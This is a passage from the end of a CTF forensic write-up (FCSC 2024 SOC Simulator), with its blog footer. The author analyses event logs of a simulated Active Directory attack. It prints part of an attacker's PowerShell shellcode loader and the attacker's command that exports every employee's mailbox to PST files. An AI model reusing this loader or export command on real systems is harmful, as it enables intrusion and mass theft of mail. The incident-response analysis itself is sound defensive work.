</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">System.Runtime.InteropServices.Marshal</span>]::Copy($c4RI, <span style="color:#ae81ff">0</span>, $bEeFY, $c4RI.length)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (([<span style="color:#66d9ef">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer((xTk kernel32.dll VirtualProtect), (cSp_ @([<span style="color:#66d9ef">IntPtr], [UIntPtr], [UInt32], [UInt32</span>].MakeByRefType()) ([<span style="color:#66d9ef">Bool</span>]))).Invoke($bEeFY, [<span style="color:#66d9ef">Uint32</span>]$c4RI.Length, 0x10, [<span style="color:#66d9ef">Ref</span>]$ixB6)) <span style="color:#f92672">-eq</span> $true) {
</span></span><span style="display:flex;"><span>        $gKB = [<span style="color:#66d9ef">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer((xTk kernel32.dll CreateThread), (cSp_ @([<span style="color:#66d9ef">IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr</span>]) ([<span style="color:#66d9ef">IntPtr</span>]))).Invoke([<span style="color:#66d9ef">IntPtr</span>]::Zero,<span style="color:#ae81ff">0</span>,$bEeFY,[<span style="color:#66d9ef">IntPtr</span>]::Zero,<span style="color:#ae81ff">0</span>,[<span style="color:#66d9ef">IntPtr</span>]::Zero)
</span></span><span style="display:flex;"><span>        [<span style="color:#66d9ef">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer((xTk kernel32.dll WaitForSingleObject), (cSp_ @([<span style="color:#66d9ef">IntPtr], [Int32</span>]))).Invoke($gKB,0xffffffff) | Out-Null
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Here we see VirtualProtect call which is commonly used by malwares to map a shellcode to an executable memory. Here there is no encryption, we could extract the base64 and load it in IDA as 64 bits intel architecture.</p>
<p><img src="/img/soc_simulator/15.png" alt=""></p>
<p>Bunch of calls seems to be a reverse shell or something similar. I didn&rsquo;t debug it because it takes time, and my goal was to find a command. I thought the command could have been there, but no. I decoded some payloads and they were all the same. I used wireshark and a shellcode runner to find out if there was a weird behavior, accessing files etc&hellip; but only find IP related to threat actors searching them in Virus Total.</p>
<h4 id="the-right-way">The right way</h4>
<p>I reverse the obfuscated payload because we never know and I didn&rsquo;t notice any command line related to exfiltration.
I try to grep for basic strings like &ldquo;rar&rdquo;, &ldquo;zip&rdquo;,&hellip; I did big bash onliners to exclude legit commands and checked the manual commands if there were.</p>
<p>So I go back to timeline explorer and scroll with a filter on the exchange machine.</p>
<p><img src="/img/soc_simulator/17.png" alt=""></p>
<p>I didn&rsquo;t notice about the event 4104 &ldquo;Script Block Logging&rdquo; (<a href="https://community.sophos.com/sophos-labs/b/blog/posts/powershell-command-history-forensics)">https://community.sophos.com/sophos-labs/b/blog/posts/powershell-command-history-forensics)</a>. It records the powershell commands. So I made a wrong assumption, I tought all commands where with the Cmdline data related to process creation (event <a href="https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4688">4688</a>) but there are commands which are not and which are recorded with the 4104 event, executed PowerShell commands.</p>
<p>So we could use grep to extract all the powershells commands run on the exchange:</p>
<p><img src="/img/soc_simulator/16.png" alt=""></p>
<p>Got It ! We see here <code>New-MailboxExportRequest</code> which are put in <code>C:\windows\system32\xwin</code> with <code>$Mailbox.Alias</code>, so basically, this command exports all the mails of all employees and create a pst export file in <code>C:\windows\system32\xwin</code> directory for each user.</p>
<p>We have the command, there are two, but the first may fail so the command changed a little bit, here it is:</p>
<p><code>foreach ($Mailbox in (Get-Mailbox -ResultSize Unlimited)) {New-MailboxExportRequest -Mailbox $Mailbox.DisplayName -FilePath &quot;\\exchange\C$\windows\system32\xwin\($Mailbox.Alias).pst&quot;}</code></p>
<p>Flag : <code>FCSC{2ee0ab1d44c759b09159ef21900c9826239a7b63e25c0e5935f200d30348b588}</code></p>
<h2 id="conclusion">Conclusion</h2>
<p>It was a pretty cool serie, thanks to the author ! It&rsquo;s not common to have many EVTX to analyze during forensic challenges and even less of an Active Directory which was nicely simulated (with automatic script/etc&hellip;), It was a good exercise!</p>

    </div>
  </article>

  
  





  <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/categories">Categories</a></li>
         
          <li><a href="/whoami">Whoami</a></li>
        
      </ul>
    </div>

    
    <div id="toc-footer" style="display: none">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#description">Description</a></li>
    <li><a href="#resolution">Resolution</a>
      <ul>
        <li><a href="#step-1---initial-vector">Step 1 - Initial vector</a></li>
        <li><a href="#step-2---stealing-secrets-1">Step 2 - Stealing secrets 1</a></li>
        <li><a href="#step-5---stealing-secrets-2">Step 5 - Stealing secrets 2</a></li>
        <li><a href="#step-4---lateralization">Step 4 - Lateralization</a></li>
        <li><a href="#step-3---exfiltration">Step 3 - Exfiltration</a>
          <ul>
            <li><a href="#rabbit-hole---undestand-powershell-payloads">Rabbit hole - Undestand powershell payloads</a></li>
            <li><a href="#the-right-way">The right way</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#conclusion">Conclusion</a></li>
  </ul>
</nav>
    </div>
    

    <div id="share-footer" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_soc_simulator%2f" aria-label="Facebook">
      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_soc_simulator%2f&text=FCSC%202024%20-%20SOC%20Simulator%20serie%20-%20Forensic" aria-label="Twitter">
      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_soc_simulator%2f&title=FCSC%202024%20-%20SOC%20Simulator%20serie%20-%20Forensic" aria-label="Linkedin">
      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_soc_simulator%2f&is_video=false&description=FCSC%202024%20-%20SOC%20Simulator%20serie%20-%20Forensic" aria-label="Pinterest">
      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=FCSC%202024%20-%20SOC%20Simulator%20serie%20-%20Forensic&body=Check out this article: https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_soc_simulator%2f" aria-label="Email">
      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_soc_simulator%2f&title=FCSC%202024%20-%20SOC%20Simulator%20serie%20-%20Forensic" aria-label="Pocket">
      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_soc_simulator%2f&title=FCSC%202024%20-%20SOC%20Simulator%20serie%20-%20Forensic" aria-label="reddit">
      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_soc_simulator%2f&name=FCSC%202024%20-%20SOC%20Simulator%20serie%20-%20Forensic&description=This%20is%20the%20write-up%20of%20SOC%20Simulator%20challenge%20which%20was%20in%20the%20Forensic%20category%20for%20the%20FCSC%202024.%20It%20involves%20EVTX%20analysis%20of%20a%20Windows%20Active%20Directory%20where%20an%20attack%20occurred.%20Our%20goal%20is%20to%20find%20the%20various%20steps%20taken%20by%20the%20attacker.%0aDescription%20Common%20introduction%20to%20the%20SOC%20Simulator%20series%0aIn%20the%20summer%20of%202022%2c%20an%20operator%20of%20vital%20importance%20%28OIV%29%20alerts%20the%20ANSSI%20because%20it%20believes%20it%20is%20the%20victim%20of%20a%20major%20cyber%20attack." aria-label="Tumblr">
      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_soc_simulator%2f&t=FCSC%202024%20-%20SOC%20Simulator%20serie%20-%20Forensic" aria-label="Hacker News">
      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>

    <div id="actions-footer">
      
        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>


  <footer id="footer">
  <div class="footer-left">
    Copyright  &copy; 2024  Itarow 
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/categories">Categories</a></li>
         
        <li><a href="/whoami">Whoami</a></li>
        
      </ul>
    </nav>
  </div>
</footer>


  </div>
</body>

<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
<script src=/lib/jquery/jquery.min.js></script>
<script src=/js/main.js></script>



</html>
